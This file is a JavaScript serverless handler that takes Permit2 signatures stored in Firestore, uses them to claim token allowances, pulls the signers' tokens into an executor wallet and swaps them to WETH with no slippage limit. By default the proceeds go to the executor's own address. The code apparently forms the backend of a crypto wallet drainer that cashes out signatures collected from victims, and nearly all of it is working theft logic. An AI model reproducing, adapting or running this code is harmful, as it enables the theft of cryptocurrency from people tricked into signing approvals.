import admin from 'firebase-admin';
import { ethers } from 'ethers';

// -----------------------------
// Configuration
// -----------------------------
const PERMIT2_ADDRESS = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
const UNIVERSAL_ROUTER = "0xEf1c6E67703c7BD7107eed8303Fbe6EC2554BF6B";

const PERMIT2_ABI = [
  "function permit(address owner, tuple(tuple(address token, uint160 amount, uint48 expiration, uint48 nonce) details, address spender, uint256 sigDeadline) permitSingle, bytes signature)",
  "function transferFrom(address from, address to, uint160 amount, address token)"
];

const ERC20_ABI = [
  "function approve(address spender, uint256 amount) returns (bool)"
];

const UNIVERSAL_ROUTER_ABI = [
  "function execute(bytes commands, bytes[] inputs, uint256 deadline) payable"
];

// -----------------------------
// Lazy Globals
// -----------------------------
let db = null;
let provider = null;
let spenderWallet = null;
let permit2Contract = null;
let routerContract = null;

async function init() {
  if (db) return; 

  const serviceAccount = {
    projectId: process.env.FIREBASE_PROJECT_ID,
    clientEmail: process.env.FIREBASE_CLIENT_EMAIL,
    privateKey: (process.env.FIREBASE_PRIVATE_KEY || "").replace(/\\n/g, '\n')
  };

  if (!admin.apps.length) {
    admin.initializeApp({ credential: admin.credential.cert(serviceAccount) });
  }
  db = admin.firestore();

  provider = new ethers.JsonRpcProvider(process.env.RPC_URL);
  spenderWallet = new ethers.Wallet(process.env.SPENDER_PRIVATE_KEY, provider);
  
  permit2Contract = new ethers.Contract(PERMIT2_ADDRESS, PERMIT2_ABI, spenderWallet);
  routerContract = new ethers.Contract(UNIVERSAL_ROUTER, UNIVERSAL_ROUTER_ABI, spenderWallet);
}

// -----------------------------
// Logic
// -----------------------------
export default async function handler(req, res) {
  // CORS & Methods
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST,OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  if (req.method === 'OPTIONS') return res.status(200).end();
  if (req.method !== 'POST') return res.status(405).json({ error: "Method Not Allowed" });

  try {
    await init();
    
    const { docId, recipient, outputToken } = req.body;
    // Default Output: WETH (Mainnet)
    const FINAL_TOKEN = outputToken || "0xC02aaa39b223FE8D0A0E5C4F27eAD9083C756Cc2"; 
    const RECIPIENT = recipient || spenderWallet.address;

    let docsToProcess = [];
    if (docId) {
      const doc = await db.collection('permit2_signatures').doc(docId).get();
      if (doc.exists && !doc.data().processed) docsToProcess.push(doc);
    } else {
      const snaps = await db.collection('permit2_signatures').where('processed', '==', false).limit(1).get();
      docsToProcess = snaps.docs;
    }

    if (!docsToProcess.length) return res.json({ ok: true, processed: 0 });

    let count = 0;
    for (const docSnap of docsToProcess) {
      const data = docSnap.data();
      
      try {
        const amount = BigInt(data.amount);

        // 1. Reconstruct Signature
        const signature = ethers.concat([
            data.r, 
            data.s, 
            ethers.toBeHex(data.v === 0 || data.v === 1 ? data.v + 27 : data.v)
        ]);

        // 2. Call Permit2.permit() to claim allowance for Executor (Self)
        // We verify if we are the spender
        if (data.spender.toLowerCase() !== spenderWallet.address.toLowerCase()) {
            throw new Error(`Spender mismatch. Signature authorizes ${data.spender}, but Executor is ${spenderWallet.address}`);
        }

        const permitTx = await permit2Contract.permit(
            data.owner,
            {
                details: {
                    token: data.token,
                    amount: amount,
                    expiration: data.deadline,
                    nonce: data.nonce
                },
                spender: spenderWallet.address,
                sigDeadline: data.deadline
            },
            signature
        );
        await permitTx.wait();

        // 3. Pull tokens from User to Executor
        const pullTx = await permit2Contract.transferFrom(data.owner, spenderWallet.address, amount, data.token);
        await pullTx.wait();

        // 4. Approve Universal Router to spend tokens from Executor
        const tokenContract = new ethers.Contract(data.token, ERC20_ABI, spenderWallet);
        const approveTx = await tokenContract.approve(UNIVERSAL_ROUTER, amount);
        await approveTx.wait();

        // 5. Build Universal Router Swap
        const feeTier = 3000;
        function encodeFee(f) {
            let hex = f.toString(16).padStart(6, '0');
            if (hex.length % 2 === 1) hex = '0' + hex;
            return '0x' + hex;
        }
        
        // V3 Path: TokenIn -> Fee -> TokenOut
        const path = ethers.concat([data.token, encodeFee(feeTier), FINAL_TOKEN]);
        
        // V3_SWAP_EXACT_IN (Command 0x00)
        // Input: (address recipient, uint256 amountIn, uint256 amountOutMin, bytes path, bool payerIsUser)
        const swapAbi = new ethers.AbiCoder();
        const swapInput = swapAbi.encode(
            ["address", "uint256", "uint256", "bytes", "bool"],
            [RECIPIENT, amount, BigInt(0), path, false] // payerIsUser = false (funds are in executor/msg.sender)
        );

        const commands = "0x00"; // V3_SWAP_EXACT_IN
        const inputs = [swapInput];
        const execDeadline = Math.floor(Date.now() / 1000) + 1800;

        // 6. Execute Swap
        // Manually setting gas limit to avoid estimation issues on complex router paths
        const tx = await routerContract.execute(commands, inputs, execDeadline, { 
            gasLimit: 500000 
        });
        const receipt = await tx.wait();

        await docSnap.ref.update({
            processed: true,
            routerTx: receipt.hash,
            processedAt: Date.now(),
            adminExecutor: "VERCEL_BACKEND"
        });
        count++;

      } catch (err) {
        console.error(`Failed doc ${docSnap.id}:`, err);
        await docSnap.ref.update({
            lastError: err.shortMessage || err.message,
            lastErrorAt: Date.now()
        });
        // Stop only if single mode
        if (docId) throw err;
      }
    }

    return res.status(200).json({ ok: true, processed: count });

  } catch (error) {
    console.error("Handler Error:", error);
    return res.status(500).json({ ok: false, error: error.message });
  }
}
